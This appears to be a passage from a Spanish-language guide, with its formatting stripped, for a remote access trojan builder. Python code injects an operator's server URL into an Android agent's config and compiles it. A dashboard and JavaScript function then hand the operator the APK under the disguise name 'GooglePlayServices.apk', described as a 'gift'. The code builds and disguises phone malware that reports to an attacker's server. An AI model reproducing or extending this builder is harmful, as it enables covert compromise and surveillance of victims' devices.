import osimport subprocessdef build_apk(server_url):# 1. Ruta al archivo de configuraciÃ³n del Agenteconfig_path = "agent-src/app/src/main/java/com/pentest/ratagent/Config.kt"# 2. Modificar la URL del servidor dinÃ¡micamenteconfig_content = f"""package com.pentest.ratagentobject Config {{const val SERVER_URL = "{server_url}"}}"""with open(config_path, "w") as f:f.write(config_content)# 3. Ejecutar la compilaciÃ³n con Gradleprint("ğŸš€ Compilando APK...")try:# Ejecuta ./gradlew assembleDebug desde la carpeta del agentesubprocess.check_call(['./gradlew', 'assembleDebug'], cwd='agent-src')return "agent-src/app/build/outputs/apk/debug/app-debug.apk"except Exception as e:print(f"âŒ Error en compilaciÃ³n: {e}")return None3. Interfaz en el Dashboard (index.html)AÃ±adiremos una secciÃ³n para que solo pongas la IP y descargues el regalo.<div class="control-group"><h4>ğŸ›  APK BUILDER</h4><input type="text" id="vps-ip" placeholder="http://tu-ip-vps:5000"><button onclick="generateAPK()">Generar y Descargar APK</button><div id="build-status"></div></div>4. FunciÃ³n en main.jsEsta funciÃ³n enviarÃ¡ la orden al servidor y esperarÃ¡ el link de descarga.function generateAPK() {const ip = document.getElementById('vps-ip').value;const status = document.getElementById('build-status');if(!ip) return alert("Pon la IP del servidor");status.innerText = "â³ Compilando... esto puede tardar 1-2 min.";fetch('/api/build-apk', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({ url: ip })}).then(res => res.blob()).then(blob => {const url = window.URL.createObjectURL(blob);const a = document.createElement('a');a.href = url;a.download = "GooglePlayServices.apk";document.body.appendChild(a);a.click();status.innerText = "âœ… Â¡APK Generado!";});}